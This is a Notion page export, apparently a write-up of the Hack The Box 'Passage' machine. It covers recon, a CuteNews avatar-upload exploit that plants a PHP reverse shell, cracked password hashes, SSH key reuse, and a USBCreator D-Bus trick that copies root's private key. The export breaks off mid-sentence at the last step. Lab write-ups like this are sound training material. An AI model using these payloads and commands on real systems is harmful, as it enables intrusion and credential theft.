{"children":[{"children":[],"uri":"https://www.notion.so/919f6cbb16d44954b390908400c99d31","type":"heading","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Recon"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/3588c92b38ea40b5b7a9296ec8165f41","type":"text","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["$ nmap -p- 10.10.10.206 > ports.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/02599c46cdc24d9fb05ab7fb0ecf9109","type":"code","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["PORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/795d7cd13f6045e8bf9b4232106c4149","type":"bulleted_list","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Port scan:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2fc2b92b19444ea3a7516f2cb85a3d72","type":"text","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["$ nmap -sC -sV -p 22,80 10.10.10.206 > targeted.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/46d50a576994420faf32e0fa994c2f5a","type":"code","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)\n|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)\n|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Passage News\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/c09aa8522c9a4969a79790b3d04c4595","type":"bulleted_list","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Targeted scan:"]]},{"children":[],"uri":"https://www.notion.so/8d937a0c1a3f402596a18e340e8b186f","type":"heading","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Enumeration"]],"depth":2},{"children":[],"uri":"https://www.notion.so/e10593441a46498481c9304eb2cb6f28","type":"bulleted_list","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Navigate to webpage, appears to be a news board."]]},{"children":[],"uri":"https://www.notion.so/bc658ac4fca54c43b843b4405e90b96a","type":"bulleted_list","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Anonymous users can comment on articles, not XSS vulnerable."]]},{"children":[],"uri":"https://www.notion.so/18ae669c57344163b8c06f4a7a23b093","type":"bulleted_list","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Found usernames: nadav (admin), paul, sid, kim"]]},{"children":[],"uri":"https://www.notion.so/5e877ed2daab4573acab8bfbee85ff70","type":"bulleted_list","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Found nameserver: passage.htb"]]},{"children":[{"children":[],"uri":"https://www.notion.so/237059cd397046e099684d18b08d25a1","type":"text","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["10.10.10.206 passage.htb",[["c",null]]]]}],"uri":"https://www.notion.so/62b0aa77874c40308c298c21243e4906","type":"bulleted_list","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Edit /etc/hosts and add the following line:"]]},{"children":[],"uri":"https://www.notion.so/2959060028bf4ac2b1280c32a4400371","type":"bulleted_list","createdTime":1616221877694,"lastEditedTime":1616221860000,"title":[["Re-navigate to webpage, no redirect."]]},{"children":[],"uri":"https://www.notion.so/acc0f48bc99f4bf88a4ce51b3c685458","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["dirbuster",[["c",null]]],[" failed, requests timed out."]]},{"children":[],"uri":"https://www.notion.so/ad70ef8841c744509dec15513a290323","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["An article on the website reveals that Fail2Ban was implemented, which locks the user out for 2 minutes when too many requests are received."]]},{"children":[],"uri":"https://www.notion.so/b75fdf44fe144fe9bc241ecb9c795319","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["crackmapexec",[["c",null]]],[" on SSH failed, also locked out by Fail2Ban."]]},{"children":[],"uri":"https://www.notion.so/22955277848743fd9a20904121f62e92","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["Board is using CuteNews to publish and manage news articles."]]},{"children":[],"uri":"https://www.notion.so/e350b20fa2314ee587b5faa556ff557d","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["Found login page: "],["http://passage.htb/CuteNews/index.php",[["a","http://10.10.10.206/CuteNews/index.php"]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/edf9f1d8ddad4d88a502ba4494859b60","type":"image","createdTime":1616221877699,"lastEditedTime":1616221860000,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F64cc0975-c41e-482a-8a28-5bbd11addba0%2FUntitled.png?width=316&table=block&id=edf9f1d8-ddad-4d88-a502-ba4494859b60","caption":[],"width":316,"height":63,"fullWidth":false,"pageWidth":false,"aspectRatio":0.19936708860759494,"preserveScale":true}],"uri":"https://www.notion.so/af09d8431ceb4a19bd5f8058fe7cba9a","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["Version info is exposed on the login page to be 2.1.2, which is vulnerable to RCE (CVE-2019-11447)."]]},{"children":[],"uri":"https://www.notion.so/e9b2bb6e4df543ee87f2381c581aae9d","type":"heading","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["Exploitation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/9e0bb6e86ae9481a9cf4c454681bcd5e","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["An attacker can register as a regular user on the website, and abuse the avatar upload function in the profile area to upload a shell."]]},{"children":[],"uri":"https://www.notion.so/dbd42e57458a430f8e0708afa4e3599f","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["There is no limit on the "],["$imgsize",[["c",null]]],[" function in "],["/core/modules/dashboard.php",[["c",null]]],[", this allows the attacker to upload large files such as a PHP reverse shell."]]},{"children":[],"uri":"https://www.notion.so/fddd996851fc4625bbd1863265d836c4","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["The CMS uses only magic bytes to validate the file type, and ignores the file extension."]]},{"children":[],"uri":"https://www.notion.so/7562d44806be46bd9445c4d721268f49","type":"bulleted_list","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["Therefore, the header content of the file can be forged to bypass the content filter, for example using the \"GIF\" header."]]},{"children":[],"uri":"https://www.notion.so/f8f7d99b7d2443089cba09d8cdb0a6ce","type":"text","createdTime":1616221877695,"lastEditedTime":1616221860000,"title":[["Method 1: RCE script (/php/webapps/48800.py)",[["b",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/ec18c394782e4d689517f8c785685ef2","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ whoami",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/8b15eedf74b440a5a47ba9895b09c90c","type":"code","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["www-data"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/f7c73c4721ba4b76884ece0f6bf1f33b","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["After entering the URL, we get a shell as www-data."]]},{"children":[{"children":[],"uri":"https://www.notion.so/a30a9a126e9844faab03a94c3eca7f8f","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ file avatar_rkogueVVDP_rkogueVVDP.php",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/2cb2ec7dca224959bf156c9e0e6e4aee","type":"code","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["avatar_rkogueVVDP_rkogueVVDP.php: GIF image data 16188 x 26736"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/173d5db944ac44c9a55aa10015afca2d","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["We see that the malicious PHP uploaded by the script is using a forged header to trick the server into thinking the reverse shell is a GIF file."]]},{"children":[{"children":[],"uri":"https://www.notion.so/8db575e95454451581180fa3e88dd785","type":"code","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\n4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88\ne26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\nf669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca\n4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/d642c7850ce44ef2871a1e749278751c","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["The script also extracted SHA-256 hashes of users:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/820bd3a822c44525b323d58d011d4023","type":"code","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\tsha256\tatlanta1\n4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc\tsha256\tegre55"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/62f1c7bcd32b4b26b68d18baadac4a2b","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Two common hashes were able to be cracked:"]]},{"children":[],"uri":"https://www.notion.so/69468a83b1664b3688eeb47960e64cf2","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Found possible passwords:\natlanta1, egre55"]]},{"children":[],"uri":"https://www.notion.so/253bb083860548879c3c2b3ff4693f6a","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["But let's try to do it manually and understand how it works, no honour in being a skid!"]]},{"children":[],"uri":"https://www.notion.so/59a63193252d4809b0717d26b8953f92","type":"text","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Method 2: Manual upload",[["b",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/edb194150d10431888316db556f317a4","type":"code","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["GIF8;\n<?php\n...\n$ip = '10.10.14.18';\n$port = 6969;"]],"language":"PHP","wrap":false}],"uri":"https://www.notion.so/6feeaf287fcf4e59a4aed26555e89f5a","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Using pentestmonkey's PHP shell, edit the file to add the magic bytes for GIF at the start of file, also include the local "],["$ip",[["c",null]]],[" and "],["$port",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/e080aaba8717478787749e6d204ecdea","type":"image","createdTime":1616221877699,"lastEditedTime":1616221860000,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3530be9d-97ce-43cb-b6bb-1b3fbdbe6191%2FUntitled.png?width=482&table=block&id=e080aaba-8717-4787-8774-9e6d204ecdea","caption":[],"width":482,"height":263,"fullWidth":false,"pageWidth":false,"aspectRatio":0.5456431535269709,"preserveScale":true}],"uri":"https://www.notion.so/6ae73a688d1c4b62b2c02d15482a7b39","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Register as a user on the website, and upload the PHP reverse shell as an avatar in the profile area."]]},{"children":[{"children":[],"uri":"https://www.notion.so/2ee0fa36af904ef0be8416c6ab70dc44","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ nc -lvnp 6969",[["c",null]]]]}],"uri":"https://www.notion.so/9a9a51805d40426a855c442ea8fd1d6d","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Upload success, now start a reverse listener on port 6969:"]]},{"children":[],"uri":"https://www.notion.so/5fc04e55fd6e4833bbeecdff8e18cee1","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Navigate to "],["http://passage.htb/CuteNews/uploads/avatar_samiko_avatar.php",[["a","http://passage.htb/CuteNews/uploads/avatar_samiko_avatar.php"]]],[" to trigger the reverse shell."]]},{"children":[{"children":[],"uri":"https://www.notion.so/ee151babb03a43eb90d8866a290de95d","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ whoami",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/2f2465475a75477986eb3a2d03fa6bc7","type":"code","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["www-data"]],"language":"PHP","wrap":false}],"uri":"https://www.notion.so/aeac00cc621a41b8aafa91373e936412","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Get shell as www-data:"]]},{"children":[],"uri":"https://www.notion.so/3bb56a97cd4944e89fe69194dbeaf08d","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Found usernames in /home:\nnadav, paul"]]},{"children":[{"children":[],"uri":"https://www.notion.so/4a90b7007ba64e40b86284ccf45e0786","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ curl 10.10.14.18:9090/linpeas.sh -O",[["c",null]]]]}],"uri":"https://www.notion.so/32aeaa4329a743c2bc688285f185f817","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Host linpeas.sh on HTTP, upload through shell with "],["curl",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/8b77c62449604dad8cd1c6c49107ca15","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ chmod +x ./linpeas.sh",[["c",null]]]]}],"uri":"https://www.notion.so/62d1cd1272f94a3c87226351560f3bbe","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Make LinPEAS executable:"]]},{"children":[],"uri":"https://www.notion.so/4869cef9d4c44cb49cb85524a52b429e","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Nothing useful from LinPEAS."]]},{"children":[],"uri":"https://www.notion.so/297e7d1b601e4b71bb2c69b20a589433","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Found file containing user hashes from earlier: "],["/var/www/html/CuteNews/cdata/users/lines",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/eb9a9f7b3ac545f9a9a49bc9747300a7","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["This entire directory is also exposed on "],["http://passage.htb/CuteNews/cdata/",[["a","http://passage.htb/CuteNews/cdata/"]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/ccd98b5a22cf46f980d278c7718237c0","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ base64 --decode hash.txt > decoded.txt",[["c",null]]]]}],"uri":"https://www.notion.so/5252f5cd50064f8cad9ef361837ddd55","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["Lines are encoded in base64, decode with:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/ba823013d5454c5099e7dd959fa3dc61","type":"code","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["a:1:{s:2:\"id\";a:1:{i:1592483236;s:10:\"paul-coles\";}}\na:1:{s:4:\"name\";a:1:{s:10:\"paul-coles\";a:9:{s:2:\"id\";s:10:\"1592483236\";s:4:\"name\";s:10:\"paul-coles\";s:3:\"acl\";s:1:\"2\";s:5:\"email\";s:16:\"paul@passage.htb\";s:4:\"nick\";s:10:\"Paul Coles\";s:4:\"pass\";s:64:\"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\";s:3:\"lts\";s:10:\"1592485556\";s:3:\"ban\";s:1:\"0\";s:3:\"cnt\";s:1:\"2\";}}}\na:1:{s:5:\"email\";a:1:{s:16:\"paul@passage.htb\";s:10:\"paul-coles\";}}\n\na:1:{s:2:\"id\";a:1:{i:1598829833;s:6:\"egre55\";}}\na:1:{s:4:\"name\";a:1:{s:6:\"egre55\";a:11:{s:2:\"id\";s:10:\"1598829833\";s:4:\"name\";s:6:\"egre55\";s:3:\"acl\";s:1:\"4\";s:5:\"email\";s:15:\"egre55@test.com\";s:4:\"nick\";s:6:\"egre55\";s:4:\"pass\";s:64:\"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc\";s:4:\"more\";s:60:\"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\";s:3:\"lts\";s:10:\"1598834079\";s:3:\"ban\";s:1:\"0\";s:6:\"avatar\";s:26:\"avatar_egre55_spwvgujw.php\";s:6:\"e-hide\";s:0:\"\";}}}\na:1:{s:5:\"email\";a:1:{s:15:\"egre55@test.com\";s:6:\"egre55\";}}\n\na:1:{s:2:\"id\";a:1:{i:1592483047;s:5:\"admin\";}}\na:1:{s:4:\"name\";a:1:{s:5:\"admin\";a:8:{s:2:\"id\";s:10:\"1592483047\";s:4:\"name\";s:5:\"admin\";s:3:\"acl\";s:1:\"1\";s:5:\"email\";s:17:\"nadav@passage.htb\";s:4:\"pass\";s:64:\"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\";s:3:\"lts\";s:10:\"1592487988\";s:3:\"ban\";s:1:\"0\";s:3:\"cnt\";s:1:\"2\";}}}\na:1:{s:5:\"email\";a:1:{s:17:\"nadav@passage.htb\";s:5:\"admin\";}}\n\na:1:{s:2:\"id\";a:1:{i:1592483281;s:9:\"sid-meier\";}}\na:1:{s:4:\"name\";a:1:{s:9:\"sid-meier\";a:9:{s:2:\"id\";s:10:\"1592483281\";s:4:\"name\";s:9:\"sid-meier\";s:3:\"acl\";s:1:\"3\";s:5:\"email\";s:15:\"sid@example.com\";s:4:\"nick\";s:9:\"Sid Meier\";s:4:\"pass\";s:64:\"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88\";s:3:\"lts\";s:10:\"1592485645\";s:3:\"ban\";s:1:\"0\";s:3:\"cnt\";s:1:\"2\";}}}\na:1:{s:5:\"email\";a:1:{s:15:\"sid@example.com\";s:9:\"sid-meier\";}}\n\na:1:{s:2:\"id\";a:1:{i:1592483309;s:9:\"kim-swift\";}}\na:1:{s:4:\"name\";a:1:{s:9:\"kim-swift\";a:9:{s:2:\"id\";s:10:\"1592483309\";s:4:\"name\";s:9:\"kim-swift\";s:3:\"acl\";s:1:\"3\";s:5:\"email\";s:15:\"kim@example.com\";s:4:\"nick\";s:9:\"Kim Swift\";s:4:\"pass\";s:64:\"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca\";s:3:\"lts\";s:10:\"1592487096\";s:3:\"ban\";s:1:\"0\";s:3:\"cnt\";s:1:\"3\";}}}\na:1:{s:5:\"email\";a:1:{s:15:\"kim@example.com\";s:9:\"kim-swift\";}}"]],"language":"PHP","wrap":false}],"uri":"https://www.notion.so/32e3af0992d94882947a9d3a55ac2a7d","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["The lines are shuffled and line breaks are missing. After rearranging, we get the following dump:"]]},{"children":[],"uri":"https://www.notion.so/01b351748884468698bdf1a50c647588","type":"bulleted_list","createdTime":1616221877696,"lastEditedTime":1616221860000,"title":[["We now know which hash belongs to which user, and get the following credential pairs:\n"],["paul:atlanta1",[["c",null]]],["\n"],["egre55:egre55",[["c",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/9f82417ae8334df9bc661ca945c0e8c7","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ su paul",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/5e7bd3b4433b4575af81199a3ffd794e","type":"code","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["su: must be run from a terminal"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/8dd99c78525146f383f1d24a8b406eff","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["su",[["c",null]]],[" as paul on the shell:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/ff9e2e9f41854163b1dd71f8a2ddac1e","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ echo \"import pty; pty.spawn('/bin/bash')\" > /tmp/shell.py",[["c",null]]]]}],"uri":"https://www.notion.so/dec6e61ab6ec4a8393b596b5288ae01b","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616231640000,"title":[["Spawn tty shell to run "],["su",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/095de80302004fab9703b2223c43ca71","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ su paul",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/9bc99da44e5b462f96915a1d910321ff","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["atlanta1",[["c",null]]]]}],"uri":"https://www.notion.so/41dcafafc9e742aa8bc6d167ad026652","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["su",[["c",null]]],[" as paul on the pseudo terminal:"]]},{"children":[],"uri":"https://www.notion.so/f193985dc8ba45eab30be4c1b06975c8","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["Get user flag!"]]},{"children":[],"uri":"https://www.notion.so/7dda1c4d32a2401b9ea060e0b299c368","type":"heading","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["Privilege Escalation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/3993c06422e741449fddeab8274e1be7","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["To make things more convenient, get Paul's "],["id_rsa",[["c",null]]],[" private key from "],["~/.ssh/",[["c",null]]],[" for a stable SSH terminal."]]},{"children":[{"children":[],"uri":"https://www.notion.so/aef60a38257c446a85c800daeb4e0bfc","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ chmod 600 paul_id_rsa",[["c",null]]]]}],"uri":"https://www.notion.so/2c9e4ea8ec3841048dcfe4e91d461105","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["Set the appropriate permissions:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/0cf1a90f2e2d4d49b4971d04c210b9b7","type":"text","createdTime":1616221877699,"lastEditedTime":1616221860000,"title":[["$ ssh paul@10.10.10.206 -i paul_id_rsa",[["c",null]]]]}],"uri":"https://www.notion.so/f689902c19c244d9b9f78b6919cf1f70","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["SSH in as paul:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/c40d1688938b407d913c7450ef97077c","type":"text","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["$ cat authorized_keys",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/cd4511230a3a49a1b3491a9d9b52fc40","type":"code","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/536a792bfefe4da69849577518d08c43","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["Found "],["~/.ssh/authorized_keys",[["c",null]]],[" file:"]]},{"children":[],"uri":"https://www.notion.so/ed2026de7c0945debcc5d456a327b121","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["Found nadav in "],["authorized_keys",[["c",null]]],[", meaning Nadav can SSH in as Paul without a password, wonder if Paul can do that as well..."]]},{"children":[{"children":[],"uri":"https://www.notion.so/c86c50954c6f4071aaad92f2a79b0a01","type":"text","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["$ ssh nadav@10.10.10.206 -i paul_id_rsa",[["c",null]]]]}],"uri":"https://www.notion.so/baccd9da3db843809d39f412a64b7a76","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["Try to SSH in as nadav using Paul's key:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2d859f19508b4cbc92b67b5e6e116adf","type":"text","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["$ id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/741ab16d537b4f2791abd98a8d4a3f06","type":"code","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/1878cb522be747099e9046ba343d80c8","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["That worked, seems like Paul and Nadav are real close friends :>"]]},{"children":[],"uri":"https://www.notion.so/d4cbfdf637f24d10aac1c85f8eca9da2","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["nadav is in the adm group, meaning we can see system logs in "],["/var/log",[["c",null]]],[". "]]},{"children":[],"uri":"https://www.notion.so/2528e3f21e51493c90aa2e39ef2167ca","type":"bulleted_list","createdTime":1616221877697,"lastEditedTime":1616221860000,"title":[["nadav is also in the sudo group, but without a password, we cannot run "],["sudo -l",[["c",null]]],[" to see what we can access."]]},{"children":[{"children":[],"uri":"https://www.notion.so/4b2de78f4034440caefb9c88351426a9","type":"code","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["root 34787 0.0 0.4 235548 19848 ? Sl 02:05 0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/ac3495490c0b46d8824149558e2a651d","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["Found privileged process "],["usb-creator-helper",[["c",null]]],[" in "],["ps aux",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/5b06d4f007d74c58bee7cd423c8799b9","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["This is a program called \"Startup Disk Creator\", used to create live USBs of Ubuntu from the Live CD or ISO image, and is included by default in all releases after Ubuntu 8.04."]]},{"children":[],"uri":"https://www.notion.so/ca33b31c1ac4474fbb3c2035d2b1301c","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["It seems that USBCreator uses a Python implementation of "],["dd",[["c",null]]],[" to write to disks."]]},{"children":[],"uri":"https://www.notion.so/f1cf1d0dba1b46d4bf13daea79ec42f7","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["However, no sanitation checks are performed on the source or target path, nor does it prompt the user for passwords."]]},{"children":[],"uri":"https://www.notion.so/dfabc3310762432b907401d83e3c81d9","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["This means any user belonging to the sudo group can overwrite arbitrary files on the filesystem, as root."]]},{"children":[{"children":[],"uri":"https://www.notion.so/4e5b1c0125764e1e8af12a006275b635","type":"text","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_id_rsa true",[["c",null]]]]}],"uri":"https://www.notion.so/5982814902574f5fa6a22cc78c4ca197","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616231880000,"title":[["Make a method call with "],["gdbus",[["c",null]]],[", to copy root's "],["id_rsa",[["c",null]]],[" to "],["/tmp",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/b4a0e4165e7a4a438f3403f3c86ba28c","type":"text","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["$ ssh root@10.10.10.206 -i root_id_rsa",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/da688c27600e49628ad3f10a19e856f3","type":"text","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["$ id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/270fe89abc02489ab447cce5d2f80f34","type":"code","createdTime":1616221877700,"lastEditedTime":1616221860000,"title":[["uid=0(root) gid=0(root) groups=0(root)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/9f67cd4b043249faaa265f0a7467c089","type":"bulleted_list","createdTime":1616221877698,"lastEditedTime":1616221860000,"title":[["Using "],["root_id_rsa",[["c",null]]],[", we can SSH in as 